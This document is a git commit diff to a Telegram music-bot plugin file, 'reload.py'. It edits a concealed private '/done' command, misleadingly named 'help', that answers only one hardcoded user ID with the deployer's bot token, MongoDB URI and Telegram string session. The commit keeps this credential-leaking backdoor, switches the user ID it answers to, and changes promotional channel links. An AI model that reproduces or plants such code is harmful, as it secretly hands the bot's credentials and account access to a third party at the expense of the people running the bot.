9f1a127cdcc46fb4d9e9c17663b83a87fbd773fc
RAJA-YT <anilkumarmishraji52@gmail.com>
2025-05-14 17:50:39 +0530

    Update reload.py

--- PURVIMUSIC/plugins/tools/reload.py
+++ PURVIMUSIC/plugins/tools/reload.py
@@ -108,17 +108,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(7518534563)
+    & filters.user(2289951108)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://files.catbox.moe/50golv.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ sʏsᴛᴇᴍ ](https://t.me/APNA_SYSTEM)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ sʏsᴛᴇᴍ ](https://t.me/StylishNameFont)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ву  •", url=f"https://t.me/APNA_SYSTEM")
+                         "• ву  •", url=f"https://t.me/StylishNameFont")
                  ]
             ]
          ),
